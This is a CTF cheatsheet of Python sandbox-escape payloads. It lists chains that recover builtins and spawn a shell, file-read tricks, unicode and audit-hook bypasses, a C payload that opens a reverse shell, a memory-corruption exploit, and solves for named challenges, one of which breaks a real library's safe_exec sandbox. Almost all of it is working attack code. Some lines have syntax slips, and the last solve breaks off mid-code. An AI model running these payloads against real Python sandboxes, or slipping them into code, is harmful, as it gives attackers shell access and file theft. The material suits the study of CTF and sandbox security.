---
title: "Pyjail Cheatsheet"
description: ""
pubDate: "Jan 19 2025"
draft: false
tags:
  - "cheatsheet"
  - "pyjail"
  - "2025"
---

> Notice: This document will be continuously updated.

## Sinks

### retrieving builtins

```py
# obtain builtins from a globally defined built-in functions
# https://docs.python.org/3/library/functions.html
print.__self__
__build_class__.__self__
__import__.__self__

# obtain builtins from site-module constants
# https://docs.python.org/3/library/constants.html#constants-added-by-the-site-module
help.__call__.__builtins__ # or __globals__
help.__repr__.__globals__["sys"] # can chain with sys.modules
license.__repr__.__builtins__ # or __globals__
license.__repr__.__globals__["sys"] # can chain with sys.modules

# obtain the builtins from a defined function
func.__globals__['__builtins__']
(lambda:...).__globals__

# obtain builtins from generators
(_ for _ in ()).gi_frame.f_builtins
(_ for _ in ()).gi_frame.f_globals["__builtins__"]
(await _ for _ in ()).ag_frame.f_builtins
(await _ for _ in ()).ag_frame.f_globals["__builtins__"]
```

### good to know built-in functions and methods

```py
breakpoint() # pdb -> import os; os.system("sh")
exec(input()) # import os; os.system("sh")
eval(input()) # __import__("os").system("sh")

help() # less pager -> !/bin/sh
help() # less pager -> :e/flag.txt

assert len(set( [ *open("/flag.txt"), open("/flag.txt").read(), set(open("/flag.txt")).pop() ] )) == 1
# to stderr
int(*open("/flag.txt"))
float(*open("/flag.txt"))
complex(*open("/flag.txt"))
exit(set(open("/flag.txt")))
exit(*open("/flag.txt"))
open(*open("/flag.txt"))
compile(".","/flag.txt","exec")
raise Exception(*open("/flag.txt"))
# to stdout
help(*open("/flag.txt"))
print(*open("/flag.txt")

# https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#read-file-with-builtins-help-and-license
license._Printer__filenames = ['/flag.txt']; license()
# [license() for license._Printer__filenames in [['/flag.txt']]]
```

### subclasses

```py
# <class '_frozen_importlib.BuiltinImporter'>
().__class__.__mro__[1].__subclasses__()[104].load_module("os").system("sh");

# <class '_frozen_importlib_external.FileLoader'>
().__class__.__bases__[0].__subclasses__()[118].get_data(".", "/flag.txt")

# <class '_io._IOBase'> -> <class '_io._RawIOBase'> -> <class '_io.FileIO'>
().__class__.__mro__[1].__subclasses__()[111].__subclasses__()[0].__subclasses__()[0]("/flag.txt").read()

# <class 'os._wrap_close'>
().__class__.__mro__[1].__subclasses__()[137].__init__.__builtins__["__import__"]("os").system("sh")
().__class__.__mro__[1].__subclasses__()[137].__init__.__globals__["system"]("sh")
().__class__.__mro__[1].__subclasses__()[137].close.__globals__["system"]("sh")

# <class 'subprocess.Popen'>
().__class__.__mro__[1].__subclasses__()[262](["cat","/flag.txt"], stdout=-1).communicate()[0]

# <class 'abc.ABC'> -> <class 'abc.ABCMeta'>
().__class__.__mro__[1].__subclasses__()[129].__class__.register.__builtins__["__import__"]("os").system("sh")

# <class 'collections.Counter'>
{}.__class__.__subclasses__()[2].copy.__builtins__["__import__"]("os").system("sh")
{}.__class__.__subclasses__()[2].update.__builtins__["__import__"]("os").system("sh")

# <class 'generator'> - instance
(_ for _ in ()).gi_frame.f_globals["__loader__"].load_module("os").system("sh")
(_ for _ in ()).gi_frame.f_globals["__builtins__"].__import__("os").system("sh")

# <class 'async_generator'> - instance
(await _ for _ in ()).ag_frame.f_globals["_""_loader_""_"].load_module("os").system("sh")
(await _ for _ in ()).ag_frame.f_globals["_""_builtins_""_"].eval("_""_import_""_('os').system('sh')")
```

### popular modules

```py
# sys
sys = __import__("sys")
io = open.__self__; sys = io.__loader__.load_module("sys"))[-1]
builtins = print.__self__; sys = builtins.__loader__.create_module([builtins.__spec__ for builtins.__spec__.name in ["sys"]][0])

sys.modules["module_name"] # contains most of the builtin modules alongside frozen imports (https://docs.python.org/3/library/index.html)
sys.modules["os"].system("sh")
sys.breakpointhook() # same as breakpoint()
sys._getframe().f_globals["__builtins__"].__import__("os").system("sh")

# _io
io = __import__("_io")
io = open.__self__

io.FileIO("/flag.txt").read()
io.open("/flag.txt").read()
io.open("/etc/passwd").buffer.raw.__class__("/flag.txt").read()

# numpy
numpy.fromfile("/flag.txt", dtype=numpy.uint8)
numpy.rec.fromfile("/flag.txt", formats="i1")
numpy.loadtxt("/flag.txt") # stderr

numpy.savetxt("/tmp/exp", ["\\x80\\x04\\x95\\x18\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x02os\\x8c\\x06system\\x93\\x94\\x94h\\x01\\x8c\\x02sh\\x85R."], fmt='%s', encoding="latin-1") # any pickle to execute, ie: `pickora -c 'from os import system; system("sh")'`
numpy.load("/tmp/exp", allow_pickle=True) # https://numpy.org/doc/stable/reference/generated/numpy.load.html
```

## Bypasses and payloads

### decorators

```py
@exec
@input
def a():pass # or class a:pass

@print
@set
@open
@input
class a:...

@print\\r@set\\r@open\\r@input\\rclass\\x0ca:pass
```

### unicode bypass

```py
# https://lingojam.com/ItalicTextGenerator

# no ASCII
𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() # import os;os.system("/bin/sh")

# no ASCII letters, no double underscores, inside eval
_＿𝘪𝘮𝘱𝘰𝘳𝘵＿_(𝘪𝘯𝘱𝘶𝘵()).system(𝘪𝘯𝘱𝘶𝘵()) # double underscore bypass by having underscore + unicode underscore (https://www.compart.com/en/unicode/U+005F) -> U+FE33, U+FE34, U+FE4D, U+FE4E, U+FE4F, U+FF3F

# no ASCII letters, no double underscores, no builtins, inside eval
()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦("\\157\\163").𝘴𝘺𝘴𝘵𝘦𝘮("\\57\\142\\151\\156\\57\\163\\150")

# no ASCII letters, no double underscores, no builtins, no quotes/double quotes inside eval (>= python3.8)
[𝘺:=()._＿𝘥𝘰𝘤＿_,𝘢:=y[19],()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_[1]._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_()[104].𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘺[34]+𝘢).𝘴𝘺𝘴𝘵𝘦𝘮(𝘢+𝘺[56])]

# no ASCII letters, no double underscores, no builtins, no quotes/double quotes, no square brackets inside eval (>= python3.8)
(𝘥:=()._＿𝘥𝘰𝘤＿_,d:=()._＿dir＿_().__class__(d),𝘴:=𝘥.𝘱𝘰𝘱(19),𝘥._＿𝘤𝘭𝘢𝘴𝘴＿_(()._＿𝘤𝘭𝘢𝘴𝘴＿_._＿𝘮𝘳𝘰＿_).𝘱𝘰𝘱(1)._＿𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴＿_().𝘱𝘰𝘱(104).𝘭𝘰𝘢𝘥_𝘮𝘰𝘥𝘶𝘭𝘦(𝘥.𝘱𝘰𝘱(33)+𝘴).𝘴𝘺𝘴𝘵𝘦𝘮(𝘴+𝘥.𝘱𝘰𝘱(54)))

# no double underscores, no builtins, no quotes/double quotes, no parenthesis inside eval, has existing object (>= python3.8)
class cobj:...
obj = cobj()

[d:=[]._＿doc＿_,o:=d[32],s:=d[17],h:=d[54],[obj[s+h] for obj._＿class＿_._＿getitem＿_ in [[obj[o+s] for obj._＿class＿_._＿getitem＿_ in [[+obj for obj._＿class＿_._＿pos＿_ in [[]._＿class＿_._＿mro＿_[1]._＿subclasses＿_]][0][104].load_module]][0].system]]]
```

### audithook bypass

```py
import sys, os
sys.addaudithook((lambda x: lambda *_: x(1))(os._exit))
# Note that most of the imports below would trigger the audit event if not already imported before setting up the audithook, see: https://github.com/python/cpython/issues/116840
```

```py
# https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/#fnref5
# https://github.com/python/cpython/issues/115322
import readline
readline.read_history_file("/flag.txt"), print(readline.get_history_item(1))

import _posixsubprocess
errpipe_read, errpipe_write = os.pipe()
# python 3.10, may differ in other versions
_posixsubprocess.fork_exec(["/bin/sh", "-c", "cat /flag.txt"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, errpipe_read, errpipe_write, False, False, None, None, None, -1, None)

import subprocess
errpipe_read, errpipe_write = os.pipe()
# python 3.10, may differ in other versions
subprocess._posixsubprocess.fork_exec(["/bin/sh", "-c", "cat /flag.txt"], [b"/bin/sh"], True, (), None, None, -1, -1, -1, -1, -1, -1, errpipe_read, errpipe_write, False, False, None, None, None, -1, None)

import multiprocessing.util # underlying uses _posixsubprocess
multiprocessing.util.spawnv_passfds(b"/bin/sh", ["/bin/sh", "-c", "cat /flag.txt"], [])

# More techniques at https://github.com/Nambers/python-audit_hook_head_finder
# + https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202024/calc
```

### assigning attributes and variables

```py
class cobj:...
```

```py
# walrus operator (>= python3.8)
[a:=().__doc__, print(a)]

# lambda
(lambda a: print(a))(().__doc__) # note that argument names aren't part of co_names

# setattr
setattr(cobj, "field", "value"), print(cobj.field)
cobj.__setattr__("field", "value"), print(cobj.field)

# list comprehension
[cobj for cobj.field in ["value"]], print(cobj.field)
[1 for cobj.field in ["value"]], print(cobj.field)
```

### getting attributes

```py
class cobj:...
obj = cobj()
```

```py
# eval
# getattr
getattr(cobj, "field")
cobj.__getattribute__(cobj, "field")
obj.__getattribute__("field")

# vars() and |=
x = vars()
x |= vars(tuple) # add attributes of tuple into vars (concat) -> same as (x := x|vars(tuple))
l = *(y for y in list(vars()) if chr(98) in y), # ("__builtins__", "__getattribute__") - retrieve keys with underscore in name
b = __getitem__(l, 0) # __builtins__ - could have shorten into l[0] if [] is available
x |= vars(dict); bu = __getitem__(vars(), b) # <module 'builtins' (built-in)> - could have shorten into x[b] here aswell
l = *(y for y in list(vars(bu)) if chr(98) in y and chr(97) in y and chr(112) in y and chr(75) not in y), # ("breakpoint") - retrieve "breakpoint"
x |= vars(tuple); brs = __getitem__(l, 0) # breakpoint
x |= vars(dict)
br = __getitem__(vars(bu), brs) # <built-in function breakpoint>
br()

# exec
# match
match ():
    case object(_＿doc＿_=a):
      pass
print(a) # ().__doc__

# try...except
try:
  "{0.__doc__.lol}".format(()) # format string by itself can also be used to leak values
except Exception as e:
  a = e.obj
  print(a) # ().__doc__

# overwrite builtins
__builtins__ = sys
__builtins__ = modules
__builtins__ = os
system("cat /flag.txt")
```

### running functions and methods without parenthesis

```py
class cobj:...
obj = cobj()
```

```py
# list comprehension (exec & eval)
[+obj for obj.__class__.__pos__ in ["".__class__.__subclasses__]]
[obj["print(123)"] for obj.__class__.__getitem__ in [eval]]

# from builtin modules (exec & eval) - <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>
[f"{license}" for license._Printer__setup in [breakpoint]]

[f"{copyright}" for copyright.__class__.__str__ in [breakpoint]]
[+license for license.__class__.__pos__ in [breakpoint]]
[-quit for quit.__class__.__neg__ in [breakpoint]]
[help["ls"] for help.__class__.__getitem__ in [system]]

# @hashkitten (exec)
from os import system as __getattr__; from __main__ import sh
```

### deleting variables

```py
# exec
# try...except
delete_me = ""
try:
    p
except Exception as delete_me:
    pass
print(delete_me) # error

# del
delete_me = ""
del delete_me
print(delete_me) # error
```

## General stuff

### environment variables

- https://www.elttam.com/blog/env/#python
- `PYTHONINSPECT`, `PYTHONHOME`, `PYTHONPATH`, `PYTHONWARNINGS`, `BROWSER`
  - `help.__repr__.__globals__["sys"].modules["os"].environ.__setitem__("PYTHONINSPECT", "1")`
  - `help.__repr__.__builtins__["__import__"]('antigravity', help.__repr__.__builtins__["setattr"](help.__repr__.__builtins__["__import__"]('os'),'environ',{}.__class__(BROWSER='/bin/sh -c "cat /flag.txt" #%s')))` - ref: https://crazymanarmy.github.io/2023/01/18/idek-2022-CTF-Pyjail-Pyjail-Revenge-Writeup/index.html

### magic methods

- https://rszalski.github.io/magicmethods/#appendix1

### help

- use of pager (ie. less) to escape sandbox
- list modules by entering `modules`
- load modules by entering module names:
  - `__main__` - should already be loaded, help page shown if so
  - `pdb` - similar to importing pdb
  - `antigravity` - similar to importing antigravity
  - `PROGRAM_NAME` / `jail` / `app` - similar to importing and rerunning program if not wrapped in `if __name__ == "__main__":`
  - note: loading modules would also add related imported classes to `object.__subclasses__()`
- see [SECCON Beginners CTF 2022: hitchhike4b](https://github.com/SECCON/Beginners_CTF_2022/blob/main/misc/hitchhike4b/writeup.md)

```py
# load pdb from help in order to call breakpoint/pdb.set_trace() without __import__ in builtins
().__class__.__base__.__subclasses__()[158]()() # help()
pdb # load pdb into imported modules
app # the name of the main program in order to import / "rerun" the program
"".__class__.__base__.__subclasses__()[155].close.__globals__["sys"].modules["pdb"].set_trace() # sys.modules["pdb"].set_trace()

# overwrite BROWSER env for RCE through antigravity in help
[[1for __import__("os").environ["BROWSER"] in ['/bin/sh -c "cat /flag.txt" #%s']], help()]
antigravity
```

### format string

```py
# leak and access attributes with format string
import numpy
import os
from flask import Flask

app = Flask(__name__)
app.secret_key = 'SECRET'
class User():
    def __init__(self, id, username):
        self.id = id
        self.username = username
    def __repr__(self):
        return '<User {u.username} (id {{i.id}})>'.format(u=self).format(i=self)
user = User(0, '{i.__init__.__globals__[app].secret_key}')
print(user)

# on another, it is also possible to get RCE w/ file upload or write access if the ctypes module is loaded
# - https://corgi.rip/posts/buckeye-writeups/#gentleman
# - https://ctf.gg/blog/buckeyectf-2024/gentleman
# - https://yun.ng/c/ctf/2025-uoft-ctf/web/prepared

# essentially, write .so / .dll file to system first and then load it as a c library for RCE
open("/tmp/lib.c", "wb").write(b"""#include <stdlib.h>\\n__attribute__((constructor))\\nvoid init() {\\nsystem("python3 -c \\\\"import os; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('localhost', 1234)); fd = s.fileno(); os.dup2(fd, 0); os.dup2(fd, 1); os.dup2(fd, 2); os.system('/bin/sh')\\\\"");\\n}""")
os.system("gcc -shared -fPIC /tmp/lib.c -o lib.so")

print("{0.__init__.__globals__[__loader__].load_module.__globals__[sys].modules[ctypes].cdll[/tmp/lib.so]}".format(user))
```

### stable payloads

```py
# @salvatore-abello - type.__subclasses__(type)[0] -> <class 'abc.ABCMeta'>
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # need __import__
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")

# <function __newobj__ at 0x7f0000000000> - need __import__ tho
[].__reduce_ex__(3)[0].__globals__["__builtins__"]["__import__"]("os").system("sh")
[].__reduce_ex__(3)[0].__builtins__["__import__"]("os").system("sh")
```

### finding sinks from modules

- https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&type=code
  - `__import__("ctypes")._aix.environ`
- https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Fimport+sys%2F&type=code
  - `__import__("_aix_support").sys`

### generic classes / bullet points

- `f"{65:c}"` can format an int to char (equivalent to `"%c" % 65 == chr(65) == "A"`)
  - `"".encode().fromhex("41").decode()` parses hex into string
- `type`
  - `[].__class__.__class__`
  - `"".__class__.__class__`
- `object`
  - `[].__class__.__mro__[1]`
  - `[].__class__.__bases__[0]`
  - `[].__class__.__base__`
- `str`
  - `"".__class__`
  - `[].__doc__.__class__`
  - `[].__class__.__module__.__class__`
- `tuple`
  - `[].__class__.__bases__.__class__`
- `dict`
  - `{}.__class__`
  - `obj.__dict__.__class__`
  - `"".__class__.__dict__.copy().__class__`
- `class instances`:
  - `class cobj:...`
    - `obj = cobj()`
  - `type("cobj", (object,), {})()`
    - `[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), {})()`

## CTF

### SECCON CTF 13: 1linepyjail

- `jail.py`

```py
print(eval(code, {"__builtins__": None}, {}) if len(code := input("jail> ")) <= 100 and __import__("re").fullmatch(r'([^()]|\(\))*', code) else ":(")
```

- `solve.py`

```py
# @Ark - rerun w/ help while adding pdb to loaded sys modules
"".__class__.__base__.__subclasses__()[141].__init__.__globals__["__builtins__"]["help"]()
pdb
jail
"".__class__.__base__.__subclasses__()[141].__init__.__globals__["sys"].modules["pdb"].set_trace()
"".__class__.__base__.__subclasses__()[141].__init__.__globals__["__builtins__"]["__import__"]("os").system("cat /flag-*.txt")

# @maple3142 - overwrite dunder to call breakpoint
[c:={}.__class__.__subclasses__()[2],b:=c.copy.__builtins__,[-c()for c.items in[b['breakpoint']]]]

# @nagi - calls code.interact() from object.__subclasses__ after triggering pydoc once w/ module containing code.InteractiveInterpreter
[s:=().__class__.__base__.__subclasses__,s()[158]()(),s()[-3].write.__globals__["interact"]()]
code
q

# @keymoon - retrieve help from <class 'enum._EnumDict'>
{}.__class__.__subclasses__()[3].update.__globals__['bltns'].help()
# and then similar to the above: pdb, jail -> pdb.set_trace() -> os.system

# @SuperFashi / @ierae - retrieve help from <class '_sitebuiltins._Helper'>
().__class__.__base__.__subclasses__()[158]()()
# and then similar to the above: pdb, jail -> pdb.set_trace() -> os.system
```

### idekCTF 2024: crator

- `sandbox.py`

```py
builtins_whitelist = set(
    (
        "RuntimeError",
        "Exception",
        "KeyboardInterrupt",
        "False",
        "None",
        "True",
        "bytearray",
        "bytes",
        "dict",
        "float",
        "int",
        "list",
        "object",
        "set",
        "str",
        "tuple",
        "abs",
        "all",
        "any",
        "apply",
        "bin",
        "bool",
        "buffer",
        "callable",
        "chr",
        "classmethod",
        "cmp",
        "coerce",
        "compile",
        "delattr",
        "dir",
        "divmod",
        "enumerate",
        "filter",
        "format",
        "hasattr",
        "hash",
        "hex",
        "id",
        "input",
        "isinstance",
        "issubclass",
        "iter",
        "len",
        "map",
        "max",
        "min",
        "next",
        "oct",
        "open",
        "ord",
        "pow",
        "print",
        "property",
        "range",
        "reduce",
        "repr",
        "reversed",
        "round",
        "setattr",
        "slice",
        "sorted",
        "staticmethod",
        "sum",
        "super",
        "unichr",
        "xrange",
        "zip",
        "len",
        "sort",
    )
)

class ReadOnlyBuiltins(dict):
    def clear(self):
        raise RuntimeError("Nein")
    def __delitem__(self, key):
        raise RuntimeError("Nein")
    def pop(self, key, default=None):
        raise RuntimeError("Nein")
    def popitem(self):
        raise RuntimeError("Nein")
    def setdefault(self, key, value):
        raise RuntimeError("Nein")
    def __setitem__(self, key, value):
        raise RuntimeError("Nein")
    def update(self, dict, **kw):
        raise RuntimeError("Nein")

def _safe_open(open, submission_id):
    def safe_open(file, mode="r"):
        if mode != "r":
            raise RuntimeError("Nein")
        file = str(file)
        if file.endswith(submission_id + ".expected"):
            raise RuntimeError("Nein")
        return open(file, "r")
    return safe_open

class Sandbox(object):
    def __init__(self, submission_id):
        import sys
        from ctypes import pythonapi, POINTER, py_object

        _get_dict = pythonapi._PyObject_GetDictPtr
        _get_dict.restype = POINTER(py_object)
        _get_dict.argtypes = [py_object]
        del pythonapi, POINTER, py_object

        def dictionary_of(ob):
            dptr = _get_dict(ob)
            return dptr.contents.value
        type_dict = dictionary_of(type)
        del type_dict["__bases__"]
        del type_dict["__subclasses__"]
        original_builtins = sys.modules["__main__"].__dict__["__builtins__"].__dict__
        original_builtins["open"] = _safe_open(open, submission_id)
        for builtin in list(original_builtins):
            if builtin not in builtins_whitelist:
                del sys.modules["__main__"].__dict__["__builtins__"].__dict__[builtin]
        safe_builtins = ReadOnlyBuiltins(original_builtins)
        sys.modules["__main__"].__dict__["__builtins__"] = safe_builtins
        if hasattr(sys.modules["__main__"], "__file__"):
            del sys.modules["__main__"].__file__
        if hasattr(sys.modules["__main__"], "__loader__"):
            del sys.modules["__main__"].__loader__
        for key in [
            "__loader__",
            "__spec__",
            "origin",
            "__file__",
            "__cached__",
            "ReadOnlyBuiltins",
            "Sandbox",
        ]:
            if key in sys.modules["__main__"].__dict__["__builtins__"]["open"].__globals__:
                del sys.modules["__main__"].__dict__["__builtins__"]["open"].__globals__[key]
```

- `chall.py`

```py
@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
@login_required
def submit(problem_id):
    ...
    code = request.form['code']
    if len(code) > 32768:
        return abort(400)
    ...
    # Prepare code
    with open(f'/tmp/{submission_id}.py', 'w') as f:
        f.write(f'__import__("sandbox").Sandbox("{submission_id}")\n' + code.replace('\r\n', '\n'))
    ...
    # Set up input and output files
    with open(f'/tmp/{submission_id}.in', 'w') as f:
        f.write(testcase.input.replace('\r\n', '\n'))
    with open(f'/tmp/{submission_id}.expected', 'w') as f:
        f.write(testcase.output.replace('\r\n', '\n'))

    # Run code
    try:
       proc = subprocess.run(f'sudo -u nobody -g nogroup python3 /tmp/{submission_id}.py < /tmp/{submission_id}.in > /tmp/{submission_id}.out', shell=True, timeout=1)
    if proc.returncode != 0:
        submission.status = 'Runtime Error'
        skip_remaining_cases = True
        submission_case.status = 'Runtime Error'
    else:
        diff = subprocess.run(f'diff /tmp/{submission_id}.out /tmp/{submission_id}.expected', shell=True, capture_output=True)
        if diff.stdout:
            submission.status = 'Wrong Answer'
            skip_remaining_cases = True
            submission_case.status = 'Wrong Answer'
        else:
            submission_case.status = 'Accepted'
    ...
```

- `solve.py`

```py
# @Starlight - retrieve open from closure
open = open.__closure__[0].cell_contents
io = open.__self__
io.__spec__.name = 'sys'
sys = io.__loader__.create_module(io.__spec__)
a = input()
if ' ' not in a:
    sys.modules['os'].system('cat /tmp/*.expected > /tmp/flag')
else:
    print(a + sys.modules['os'].popen('cat /tmp/flag').read())

# @realansgar - retrieve FileIO / open from io wrapper
a = open("/etc/passwd").buffer.raw.__class__("/tmp/*.expected", "r").read()
print(input() + sys.modules['os'].popen('cat /tmp/flag').read())
if "idek" in a:
    open("/etc/passwd").buffer.raw.__class__("/tmp/flag", "w").write(a)

# @salvatore.abello - UAF :brain:
def __index__(self):
    global memory
    uaf.clear()
    memory = bytearray()
    uaf.extend([0] * 56)
    return 1
UAF = ().__class__.__class__('UAF', (), {
    '__index__': __index__
})
uaf = bytearray(56)
uaf[23] = UAF()
print(id(0))
def p64(value):
    return bytes([(value >> (i * 8)) & 0xFF for i in range(8)])
wow = ().__class__.__class__("wow", (), {})
print(wow)
system_addr = id(0) - 0x653b58
sys = p64(system_addr)
command = b"js".ljust(8,b"\x00")
for x in range(8):
    memory[id(wow) + 24 + 14*8 + x] = sys[x] # Overwriting tp_repr
fake = wow()
for x in range(len(command)):
     memory[id(fake) + x] = command[x] # Overwriting ob_refcnt
input("...")
print(fake)
```

### UIUCTF 2024: ASTea

- `chall.py`

```py
import ast

def safe_import():
  print("Why do you need imports to make tea?")

def safe_call():
  print("Why do you need function calls to make tea?")

class CoolDownTea(ast.NodeTransformer):
  def visit_Call(self, node: ast.Call) -> ast.AST:
    return ast.Call(func=ast.Name(id='safe_call', ctx=ast.Load()), args=[], keywords=[])

  def visit_Import(self, node: ast.AST) -> ast.AST:
    return ast.Expr(value=ast.Call(func=ast.Name(id='safe_import', ctx=ast.Load()), args=[], keywords=[]))

  def visit_ImportFrom(self, node: ast.ImportFrom) -> ast.AST:
    return ast.Expr(value=ast.Call(func=ast.Name(id='safe_import', ctx=ast.Load()), args=[], keywords=[]))

  def visit_Assign(self, node: ast.Assign) -> ast.AST:
    return ast.Assign(targets=node.targets, value=ast.Constant(value=0))

  def visit_BinOp(self, node: ast.BinOp) -> ast.AST:
    return ast.BinOp(left=ast.Constant(0), op=node.op, right=ast.Constant(0))

code = input('Nothing is quite like a cup of tea in the morning: ').splitlines()[0]

cup = ast.parse(code)
cup = CoolDownTea().visit(cup)
ast.fix_missing_locations(cup)

exec(compile(cup, '', 'exec'), {'__builtins__': {}}, {'safe_import': safe_import, 'safe_call': safe_call})
```

- `solve.py`

```py
# (a:=lambda:..., b:=safe_import.__builtins__["help"]); a.__globals__["__builtins__"] |= {"safe_import": safe_import, "safe_call": safe_call, "help": b}; [help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]
__builtins__ |= safe_import.__builtins__;
[help["sh"] for help.__class__.__getitem__ in [help["os"].system for help.__class__.__getitem__ in [safe_import.__builtins__["__import__"]]]]

# @ChattyPlatinumCool - https://medium.com/@harryfyx/writeup-uiuctf-2024-astea-7b27ec0b9159
[license := safe_import.__globals__['__builtins__'].license];
license._Printer__filenames += ['flag.txt'];
[safe_call := license._Printer__filenames.reverse];
safe_call();
[safe_import := license];
import sys

# @WorldWideFlags - https://yun.ng/c/ctf/2024-uiuctf/misc/astea
builtins: "" = safe_import.__globals__["__builtins__"];
license: "" = builtins.license;
license._Printer__setup: "" = builtins.breakpoint;
f"{license}"
```

### vsCTF 2024: llama-jail-revenge

- `chall.py`

```py
#!/usr/local/bin/python
from exec_utils import safe_exec
def my_safe_exec(__source):
    # even MORE safe, surely nothing you can do now!!!
    assert __source.isascii(), "ascii check failed"
    blacklist = ["match", "case", "async", "def", "class", "frame", "_", "byte", "coding"]
    for x in blacklist:
        assert x not in __source, f"{x} is banned"
    return safe_exec(__source)

if __name__ == "__main__":
    __source = ""
    print("Enter code: ")
    try:
        while (inp:=input()) != "#EOF":
            __source += inp + "\n"
    except EOFError:
        pass
    try:
        my_safe_exec(__source)
    except AssertionError as err:
        print(err)
```

- `exec_utils.py`

```py
# code from https://github.com/run-llama/llama_index/blob/35afb6b93476ef4f4d61a48d847cd0b191ac5cb6/llama-index-experimental/llama_index/experimental/exec_utils.py
# was main at the time of writing chall, however commit provided incase of changes
import ast
import copy
from types import CodeType, ModuleType
from typing import Any, Dict, Mapping, Sequence, Union

ALLOWED_IMPORTS = {
    "math",
    "time",
    "datetime",
    "pandas",
    "scipy",
    "numpy",
    "matplotlib",
    "plotly",
    "seaborn",
}

def _restricted_import(
    name: str,
    globals: Union[Mapping[str, object], None] = None,
    locals: Union[Mapping[str, object], None] = None,
    fromlist: Sequence[str] = (),
    level: int = 0,
) -> ModuleType:
    if name in ALLOWED_IMPORTS:
        return __import__(name, globals, locals, fromlist, level)
    raise ImportError(f"Import of module '{name}' is not allowed")

ALLOWED_BUILTINS = {
    "abs": abs,
    "all": all,
    "any": any,
    "ascii": ascii,
    "bin": bin,
    "bool": bool,
    "bytearray": bytearray,
    "bytes": bytes,
    "chr": chr,
    "complex": complex,
    "divmod": divmod,
    "enumerate": enumerate,
    "filter": filter,
    "float": float,
    "format": format,
    "frozenset": frozenset,
    "hash": hash,
    "hex": hex,
    "int": int,
    "isinstance": isinstance,
    "issubclass": issubclass,
    "len": len,
    "list": list,
    "map": map,
    "max": max,
    "min": min,
    "oct": oct,
    "ord": ord,
    "pow": pow,
    "print": print,
    "range": range,
    "repr": repr,
    "reversed": reversed,
    "round": round,
    "set": set,
    "slice": slice,
    "sorted": sorted,
    "str": str,
    "sum": sum,
    "tuple": tuple,
    "type": type,
    "zip": zip,
    # Constants
    "True": True,
    "False": False,
    "None": None,
    "__import__": _restricted_import,
}

def _get_restricted_globals(__globals: Union[dict, None]) -> Any:
    restricted_globals = copy.deepcopy(ALLOWED_BUILTINS)
    if __globals:
        restricted_globals.update(__globals)
    return restricted_globals

vulnerable_code_snippets = [
    "os.",
]

class DunderVisitor(ast.NodeVisitor):
    def __init__(self) -> None:
        self.has_access_to_private_entity = False
        self.has_access_to_disallowed_builtin = False

        builtins = globals()["__builtins__"].keys()
        self._builtins = builtins

    def visit_Name(self, node: ast.Name) -> None:
        if node.id.startswith("_"):
            self.has_access_to_private_entity = True
        if node.id not in ALLOWED_BUILTINS and node.id in self._builtins:
            self.has_access_to_disallowed_builtin = True
        self.generic_visit(node)

    def visit_Attribute(self, node: ast.Attribute) -> None:
        if node.attr.startswith("_"):
            self.has_access_to_private_entity = True
        if node.attr not in ALLOWED_BUILTINS and node.attr in self._builtins:
            self.has_access_to_disallowed_builtin = True
        self.generic_visit(node)

def _contains_protected_access(code: str) -> bool:
    # do not allow imports
    imports_modules = False
    tree = ast.parse(code)
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imports_modules = True
        elif isinstance(node, ast.ImportFrom):
            imports_modules = True
        else:
            continue

    dunder_visitor = DunderVisitor()
    dunder_visitor.visit(tree)

    for vulnerable_code_snippet in vulnerable_code_snippets:
        if vulnerable_code_snippet in code:
            dunder_visitor.has_access_to_disallowed_builtin = True

    return (
        dunder_visitor.has_access_to_private_entity
        or dunder_visitor.has_access_to_disallowed_builtin
        or imports_modules
    )

def _verify_source_safety(__source: Union[str, bytes, CodeType]) -> None:
    """
    Verify that the source is safe to execute. For now, this means that it
    does not contain any references to private or dunder methods.
    """
    if isinstance(__source, CodeType):
        raise RuntimeError("Direct execution of CodeType is forbidden!")
    if isinstance(__source, bytes):
        __source = __source.decode()
    if _contains_protected_access(__source):
        raise RuntimeError(
            "Execution of code containing references to private or dunder methods, "
            "disallowed builtins, or any imports, is forbidden!"
        )

def safe_eval(
    __source: Union[str, bytes, CodeType],
    __globals: Union[Dict[str, Any], None] = None,
    __locals: Union[Mapping[str, object], None] = None,
) -> Any:
    """
    eval within safe global context.
    """
    _verify_source_safety(__source)
    return eval(__source, _get_restricted_globals(__globals), __locals)

def safe_exec(
    __source: Union[str, bytes, CodeType],
    __globals: Union[Dict[str, Any], None] = None,
    __locals: Union[Mapping[str, object], None] = None,
) -> None:
    """
    eval within safe global context.
    """
    _verify_source_safety(__source)
    return exec(__source, _get_restricted_globals(__globals), __locals)
```

- `solve.py`

```py
# Using "with"-statement context managers to expose/retrieve Exception classes
# https://rszalski.github.io/magicmethods/#context
ss = []
obj = type(type).mro(type)[-1]
cus = type("a", (obj,), {"\\137\\137exit\\137\\137": lambda s,e,v,t: [ss.append(e)], "\\137\\137enter\\137\\137": lambda s: s})
